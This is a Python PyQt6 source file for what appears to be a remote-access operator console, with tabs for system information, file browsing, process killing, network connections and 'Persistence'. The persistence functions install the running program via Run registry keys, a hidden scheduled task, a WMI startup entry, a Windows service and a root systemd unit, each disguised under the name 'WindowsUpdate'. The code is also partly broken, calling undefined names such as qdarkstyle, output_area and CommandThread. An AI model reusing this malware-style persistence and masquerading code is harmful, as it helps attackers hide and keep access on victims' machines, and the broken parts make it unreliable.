from PyQt6.QtWidgets import (
    QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTextEdit, QLineEdit, QPushButton, QLabel,
    QSplitter, QTreeWidget, QTreeWidgetItem, QFileDialog,
    QMessageBox, QGroupBox, QGridLayout, QMenu, QTabWidget,
    QTableWidget, QTableWidgetItem, QHeaderView, QProgressBar
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt6.QtGui import QIcon, QColor
import json
import os
import subprocess
import threading
import shutil
import datetime
import socket
import platform
import psutil
import base64
import winreg
import hashlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import win32serviceutil
import win32service
import win32event
import servicemanager
import win32api
import win32con
import win32security
import win32process
import win32ts
import win32net
import win32netcon
import win32wnet
import win32com.client
import wmi
import netifaces
import requests
import time
import sys

# Platform-specific imports
if platform.system() == "Windows":
    import winreg
    import win32api
    import win32con
    import win32security
    import win32ts
    import win32net
    import win32netcon
    import win32com.client
    import wmi
else:
    # Linux-specific imports
    import pwd
    import grp
    import fcntl
    import termios
    import struct

class SystemInfoThread(QThread):
    info_updated = pyqtSignal(dict)
    
    def __init__(self):
        super().__init__()
        self.running = True
        
    def run(self):
        while self.running:
            try:
                info = self.gather_system_info()
                self.info_updated.emit(info)
                time.sleep(5)  # Update every 5 seconds
            except Exception as e:
                print(f"Error gathering system info: {str(e)}")
                
    def gather_system_info(self):
        info = {}
        
        # Basic system info
        info['platform'] = platform.system()
        info['hostname'] = platform.node()
        info['processor'] = platform.processor()
        info['python_version'] = platform.python_version()
        
        # CPU info
        info['cpu_percent'] = psutil.cpu_percent(interval=1)
        info['cpu_count'] = psutil.cpu_count()
        
        # Memory info
        memory = psutil.virtual_memory()
        info['memory_total'] = memory.total
        info['memory_available'] = memory.available
        info['memory_percent'] = memory.percent
        
        # Disk info
        disk = psutil.disk_usage('/')
        info['disk_total'] = disk.total
        info['disk_free'] = disk.free
        info['disk_percent'] = disk.percent
        
        # Network info
        net_io = psutil.net_io_counters()
        info['net_bytes_sent'] = net_io.bytes_sent
        info['net_bytes_recv'] = net_io.bytes_recv
        
        # Process info
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
            try:
                processes.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        info['processes'] = processes
        
        # User info
        if platform.system() == "Windows":
            try:
                wmi_obj = wmi.WMI()
                users = []
                for user in wmi_obj.Win32_UserAccount():
                    users.append({
                        'name': user.Name,
                        'fullname': user.FullName,
                        'disabled': user.Disabled,
                        'sid': user.SID
                    })
                info['users'] = users
            except:
                info['users'] = []
        else:
            try:
                users = []
                for user in pwd.getpwall():
                    users.append({
                        'name': user.pw_name,
                        'uid': user.pw_uid,
                        'gid': user.pw_gid,
                        'home': user.pw_dir,
                        'shell': user.pw_shell
                    })
                info['users'] = users
            except:
                info['users'] = []
        
        # Service info (Windows only)
        if platform.system() == "Windows":
            try:
                wmi_obj = wmi.WMI()
                services = []
                for service in wmi_obj.Win32_Service():
                    services.append({
                        'name': service.Name,
                        'display_name': service.DisplayName,
                        'state': service.State,
                        'start_mode': service.StartMode
                    })
                info['services'] = services
            except:
                info['services'] = []
        else:
            # Linux service info
            try:
                services = []
                for service in psutil.process_iter(['name', 'pid', 'status']):
                    try:
                        services.append({
                            'name': service.info['name'],
                            'pid': service.info['pid'],
                            'status': service.info['status']
                        })
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
                info['services'] = services
            except:
                info['services'] = []
        
        # Network connections
        connections = []
        for conn in psutil.net_connections():
            try:
                connections.append({
                    'local_addr': f"{conn.laddr.ip}:{conn.laddr.port}",
                    'remote_addr': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                    'status': conn.status,
                    'pid': conn.pid
                })
            except:
                pass
        info['connections'] = connections
        
        return info
        
    def stop(self):
        self.running = False

class FileTransferThread(QThread):
    progress_updated = pyqtSignal(int)
    transfer_complete = pyqtSignal(bool, str)
    
    def __init__(self, source, destination, is_upload=True):
        super().__init__()
        self.source = source
        self.destination = destination
        self.is_upload = is_upload
        
    def run(self):
        try:
            if self.is_upload:
                self.upload_file()
            else:
                self.download_file()
        except Exception as e:
            self.transfer_complete.emit(False, str(e))
            
    def upload_file(self):
        try:
            total_size = os.path.getsize(self.source)
            uploaded = 0
            
            with open(self.source, 'rb') as f:
                with open(self.destination, 'wb') as dest:
                    while True:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        dest.write(chunk)
                        uploaded += len(chunk)
                        progress = int((uploaded / total_size) * 100)
                        self.progress_updated.emit(progress)
                        
            self.transfer_complete.emit(True, "Upload complete")
        except Exception as e:
            self.transfer_complete.emit(False, str(e))
            
    def download_file(self):
        try:
            total_size = os.path.getsize(self.source)
            downloaded = 0
            
            with open(self.source, 'rb') as f:
                with open(self.destination, 'wb') as dest:
                    while True:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        dest.write(chunk)
                        downloaded += len(chunk)
                        progress = int((downloaded / total_size) * 100)
                        self.progress_updated.emit(progress)
                        
            self.transfer_complete.emit(True, "Download complete")
        except Exception as e:
            self.transfer_complete.emit(False, str(e))

class SessionWindow(QMainWindow):
    def __init__(self, session_id, client_info):
        super().__init__()
        self.session_id = session_id
        self.client_info = client_info
        self.setWindowTitle(f"Session - {session_id}")
        self.setMinimumSize(1200, 800)
        self.encryption_key = Fernet.generate_key()
        self.setup_ui()
        self.last_seen = datetime.datetime.now()
        self.system_info_thread = SystemInfoThread()
        self.system_info_thread.info_updated.connect(self.update_system_info)
        self.system_info_thread.start()
        
    def setup_ui(self):
        # Create main widget and layout
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout(main_widget)
        
        # Create tab widget
        tabs = QTabWidget()
        
        # Create tabs
        self.setup_system_info_tab(tabs)
        self.setup_file_manager_tab(tabs)
        self.setup_process_tab(tabs)
        self.setup_network_tab(tabs)
        self.setup_persistence_tab(tabs)
        
        layout.addWidget(tabs)
        
        # Apply dark style
        self.setStyleSheet(qdarkstyle.load_stylesheet())
        
    def setup_system_info_tab(self, tabs):
        system_widget = QWidget()
        layout = QVBoxLayout(system_widget)
        
        # System Info Panel
        info_group = QGroupBox("System Information")
        info_layout = QGridLayout()
        
        # System details
        self.hostname_label = QLabel("Hostname: " + platform.node())
        self.ip_label = QLabel("IP: " + self.get_local_ip())
        self.os_label = QLabel("OS: " + platform.system() + " " + platform.release())
        self.username_label = QLabel("User: " + os.getlogin())
        self.last_seen_label = QLabel("Last Seen: " + self.last_seen.strftime("%Y-%m-%d %H:%M:%S"))
        
        info_layout.addWidget(self.hostname_label, 0, 0)
        info_layout.addWidget(self.ip_label, 0, 1)
        info_layout.addWidget(self.os_label, 1, 0)
        info_layout.addWidget(self.username_label, 1, 1)
        info_layout.addWidget(self.last_seen_label, 2, 0)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        # CPU and Memory Usage
        usage_group = QGroupBox("Resource Usage")
        usage_layout = QGridLayout()
        
        self.cpu_label = QLabel("CPU Usage:")
        self.cpu_bar = QProgressBar()
        self.memory_label = QLabel("Memory Usage:")
        self.memory_bar = QProgressBar()
        
        usage_layout.addWidget(self.cpu_label, 0, 0)
        usage_layout.addWidget(self.cpu_bar, 0, 1)
        usage_layout.addWidget(self.memory_label, 1, 0)
        usage_layout.addWidget(self.memory_bar, 1, 1)
        
        usage_group.setLayout(usage_layout)
        layout.addWidget(usage_group)
        
        tabs.addTab(system_widget, "System Info")
        
    def setup_file_manager_tab(self, tabs):
        file_widget = QWidget()
        layout = QVBoxLayout(file_widget)
        
        # File browser controls
        controls_layout = QHBoxLayout()
        self.path_input = QLineEdit()
        self.path_input.setText(os.getcwd())
        refresh_button = QPushButton("Refresh")
        refresh_button.clicked.connect(self.refresh_file_browser)
        
        controls_layout.addWidget(QLabel("Path:"))
        controls_layout.addWidget(self.path_input)
        controls_layout.addWidget(refresh_button)
        
        # File transfer buttons
        upload_button = QPushButton("Upload")
        upload_button.clicked.connect(self.upload_file)
        download_button = QPushButton("Download")
        download_button.clicked.connect(self.download_file)
        
        controls_layout.addWidget(upload_button)
        controls_layout.addWidget(download_button)
        
        layout.addLayout(controls_layout)
        
        # File tree
        self.file_tree = QTreeWidget()
        self.file_tree.setHeaderLabels(["Name", "Type", "Size", "Modified"])
        self.file_tree.itemDoubleClicked.connect(self.handle_file_action)
        self.file_tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.file_tree.customContextMenuRequested.connect(self.show_context_menu)
        layout.addWidget(self.file_tree)
        
        tabs.addTab(file_widget, "File Manager")
        
    def setup_process_tab(self, tabs):
        process_widget = QWidget()
        layout = QVBoxLayout(process_widget)
        
        # Process table
        self.process_table = QTableWidget()
        self.process_table.setColumnCount(5)
        self.process_table.setHorizontalHeaderLabels(["PID", "Name", "User", "CPU %", "Memory %"])
        self.process_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        
        # Process controls
        controls_layout = QHBoxLayout()
        refresh_button = QPushButton("Refresh")
        refresh_button.clicked.connect(self.refresh_processes)
        kill_button = QPushButton("Kill Process")
        kill_button.clicked.connect(self.kill_selected_process)
        
        controls_layout.addWidget(refresh_button)
        controls_layout.addWidget(kill_button)
        controls_layout.addStretch()
        
        layout.addLayout(controls_layout)
        layout.addWidget(self.process_table)
        
        tabs.addTab(process_widget, "Processes")
        
    def setup_network_tab(self, tabs):
        network_widget = QWidget()
        layout = QVBoxLayout(network_widget)
        
        # Network connections table
        self.network_table = QTableWidget()
        self.network_table.setColumnCount(4)
        self.network_table.setHorizontalHeaderLabels(["Local Address", "Remote Address", "Status", "PID"])
        self.network_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        
        # Network controls
        controls_layout = QHBoxLayout()
        refresh_button = QPushButton("Refresh")
        refresh_button.clicked.connect(self.refresh_network)
        
        controls_layout.addWidget(refresh_button)
        controls_layout.addStretch()
        
        layout.addLayout(controls_layout)
        layout.addWidget(self.network_table)
        
        tabs.addTab(network_widget, "Network")
        
    def setup_persistence_tab(self, tabs):
        persistence_widget = QWidget()
        layout = QVBoxLayout(persistence_widget)
        
        # Persistence methods
        methods_group = QGroupBox("Persistence Methods")
        methods_layout = QVBoxLayout()
        
        # Startup
        startup_button = QPushButton("Add to Startup")
        startup_button.clicked.connect(self.add_to_startup)
        methods_layout.addWidget(startup_button)
        
        # Service
        service_button = QPushButton("Install as Service")
        service_button.clicked.connect(self.install_as_service)
        methods_layout.addWidget(service_button)
        
        # Registry
        registry_button = QPushButton("Add to Registry")
        registry_button.clicked.connect(self.add_to_registry)
        methods_layout.addWidget(registry_button)
        
        # Scheduled Task
        task_button = QPushButton("Create Scheduled Task")
        task_button.clicked.connect(self.create_scheduled_task)
        methods_layout.addWidget(task_button)
        
        # WMI
        wmi_button = QPushButton("Add WMI Persistence")
        wmi_button.clicked.connect(self.add_wmi_persistence)
        methods_layout.addWidget(wmi_button)
        
        methods_group.setLayout(methods_layout)
        layout.addWidget(methods_group)
        
        # Status area
        self.persistence_output = QTextEdit()
        self.persistence_output.setReadOnly(True)
        layout.addWidget(self.persistence_output)
        
        tabs.addTab(persistence_widget, "Persistence")
        
    def update_system_info(self, info):
        # Update CPU and Memory usage
        self.cpu_bar.setValue(int(info['cpu_percent']))
        self.memory_bar.setValue(int(info['memory_percent']))
        
        # Update process table
        self.process_table.setRowCount(len(info['processes']))
        for i, proc in enumerate(info['processes']):
            self.process_table.setItem(i, 0, QTableWidgetItem(str(proc['pid'])))
            self.process_table.setItem(i, 1, QTableWidgetItem(proc['name']))
            self.process_table.setItem(i, 2, QTableWidgetItem(proc['username']))
            self.process_table.setItem(i, 3, QTableWidgetItem(f"{proc['cpu_percent']:.1f}%"))
            self.process_table.setItem(i, 4, QTableWidgetItem(f"{proc['memory_percent']:.1f}%"))
            
        # Update network table
        self.network_table.setRowCount(len(info['connections']))
        for i, conn in enumerate(info['connections']):
            self.network_table.setItem(i, 0, QTableWidgetItem(conn['local_addr']))
            self.network_table.setItem(i, 1, QTableWidgetItem(conn['remote_addr'] or ''))
            self.network_table.setItem(i, 2, QTableWidgetItem(conn['status']))
            self.network_table.setItem(i, 3, QTableWidgetItem(str(conn['pid'])))
            
    def add_to_registry(self):
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            self.persistence_output.append("Added to registry successfully")
        except Exception as e:
            self.persistence_output.append(f"Error adding to registry: {str(e)}")
            
    def create_scheduled_task(self):
        try:
            scheduler = win32com.client.Dispatch('Schedule.Service')
            scheduler.Connect()
            
            root_folder = scheduler.GetFolder("\\")
            task_def = scheduler.NewTask(0)
            
            TASK_TRIGGER_LOGON = 9
            trigger = task_def.Triggers.Create(TASK_TRIGGER_LOGON)
            
            action = task_def.Actions.Create(0)
            action.Path = sys.executable
            
            task_def.Settings.Enabled = True
            task_def.Settings.Hidden = True
            
            root_folder.RegisterTaskDefinition(
                "WindowsUpdate",
                task_def,
                6,  # TASK_CREATE_OR_UPDATE
                None,
                None,
                3  # TASK_LOGON_INTERACTIVE_TOKEN
            )
            
            self.persistence_output.append("Scheduled task created successfully")
        except Exception as e:
            self.persistence_output.append(f"Error creating scheduled task: {str(e)}")
            
    def add_wmi_persistence(self):
        try:
            wmi_obj = wmi.WMI()
            startup = wmi_obj.Win32_StartupCommand.new()
            startup.Name = "WindowsUpdate"
            startup.Command = sys.executable
            startup.Location = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            startup.put()
            
            self.persistence_output.append("WMI persistence added successfully")
        except Exception as e:
            self.persistence_output.append(f"Error adding WMI persistence: {str(e)}")
            
    def kill_selected_process(self):
        selected_items = self.process_table.selectedItems()
        if not selected_items:
            return
            
        pid = int(self.process_table.item(selected_items[0].row(), 0).text())
        try:
            process = psutil.Process(pid)
            process.kill()
            self.refresh_processes()
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to kill process: {str(e)}")
            
    def refresh_processes(self):
        self.system_info_thread.run()
        
    def refresh_network(self):
        self.system_info_thread.run()
        
    def closeEvent(self, event):
        self.system_info_thread.stop()
        event.accept()

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
            
    def refresh_file_browser(self):
        self.file_tree.clear()
        path = self.path_input.text()
        
        try:
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                tree_item = QTreeWidgetItem(self.file_tree)
                tree_item.setText(0, item)
                
                if os.path.isdir(full_path):
                    tree_item.setText(1, "Directory")
                    tree_item.setText(2, "")
                else:
                    tree_item.setText(1, "File")
                    size = os.path.getsize(full_path)
                    tree_item.setText(2, f"{size:,} bytes")
                    
                # Add modified time
                modified = datetime.datetime.fromtimestamp(os.path.getmtime(full_path))
                tree_item.setText(3, modified.strftime("%Y-%m-%d %H:%M:%S"))
                
        except Exception as e:
            self.output_area.append(f"Error refreshing file browser: {str(e)}")
            
    def handle_file_action(self, item, column):
        path = os.path.join(self.path_input.text(), item.text(0))
        if os.path.isdir(path):
            self.path_input.setText(path)
            self.refresh_file_browser()
        else:
            # Handle file actions
            self.show_file_context_menu(path, item)
            
    def show_file_context_menu(self, path, item):
        menu = QMenu(self)
        
        open_action = menu.addAction("Open")
        open_action.triggered.connect(lambda: self.open_file(path))
        
        download_action = menu.addAction("Download")
        download_action.triggered.connect(lambda: self.download_file(path))
        
        delete_action = menu.addAction("Delete")
        delete_action.triggered.connect(lambda: self.delete_file(path))
        
        menu.exec(self.file_tree.mapToGlobal(self.file_tree.visualItemRect(item).bottomLeft()))
        
    def open_file(self, path):
        try:
            os.startfile(path)
        except Exception as e:
            self.output_area.append(f"Error opening file: {str(e)}")
            
    def delete_file(self, path):
        try:
            if os.path.isdir(path):
                shutil.rmtree(path)
            else:
                os.remove(path)
            self.refresh_file_browser()
        except Exception as e:
            self.output_area.append(f"Error deleting file: {str(e)}")
            
    def upload_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if file_path:
            try:
                target_path = os.path.join(self.path_input.text(), os.path.basename(file_path))
                transfer = FileTransferThread(file_path, target_path, is_upload=True)
                transfer.finished.connect(lambda msg: self.output_area.append(msg))
                transfer.error.connect(lambda msg: self.output_area.append(msg))
                transfer.start()
            except Exception as e:
                self.output_area.append(f"Error uploading file: {str(e)}")
                
    def download_file(self, source_path=None):
        if not source_path:
            selected_items = self.file_tree.selectedItems()
            if not selected_items:
                return
            source_path = os.path.join(self.path_input.text(), selected_items[0].text(0))
            
        target_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save File",
            os.path.basename(source_path)
        )
        
        if target_path:
            try:
                transfer = FileTransferThread(source_path, target_path)
                transfer.finished.connect(lambda msg: self.output_area.append(msg))
                transfer.error.connect(lambda msg: self.output_area.append(msg))
                transfer.start()
            except Exception as e:
                self.output_area.append(f"Error downloading file: {str(e)}")
                
    def execute_command(self):
        command = self.command_input.text()
        if not command:
            return
            
        self.output_area.append(f"\n> {command}")
        self.command_input.clear()
        
        # Execute command in a separate thread
        thread = CommandThread(command)
        thread.output.connect(self.handle_command_output)
        thread.start()
        
    def handle_command_output(self, output):
        self.output_area.append(output)
        # Auto-scroll to bottom
        self.output_area.verticalScrollBar().setValue(
            self.output_area.verticalScrollBar().maximum()
        )
        
    def update_last_seen(self):
        self.last_seen = datetime.datetime.now()
        self.last_seen_label.setText("Last Seen: " + self.last_seen.strftime("%Y-%m-%d %H:%M:%S"))

    def add_to_startup(self):
        try:
            if platform.system() == "Windows":
                # Windows startup
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(key)
                self.persistence_output.append("Added to Windows startup registry")
            else:
                # Linux startup
                startup_dir = os.path.expanduser("~/.config/autostart")
                os.makedirs(startup_dir, exist_ok=True)
                desktop_file = os.path.join(startup_dir, "windows-update.desktop")
                with open(desktop_file, 'w') as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Name=Windows Update
Exec={sys.executable}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
                self.persistence_output.append("Added to Linux autostart")
                
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to add to startup: {str(e)}")
            
    def install_as_service(self):
        try:
            if platform.system() == "Windows":
                # Windows service
                service_name = "WindowsUpdate"
                service_cmd = f'sc create {service_name} binPath= "{sys.executable}" start= auto'
                subprocess.run(service_cmd, shell=True, check=True)
                self.persistence_output.append("Installed as Windows service")
            else:
                # Linux service
                service_file = "/etc/systemd/system/windows-update.service"
                with open(service_file, 'w') as f:
                    f.write(f"""[Unit]
Description=Windows Update Service
After=network.target

[Service]
ExecStart={sys.executable}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
""")
                subprocess.run(["systemctl", "daemon-reload"], check=True)
                subprocess.run(["systemctl", "enable", "windows-update.service"], check=True)
                subprocess.run(["systemctl", "start", "windows-update.service"], check=True)
                self.persistence_output.append("Installed as Linux service")
                
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to install service: {str(e)}") 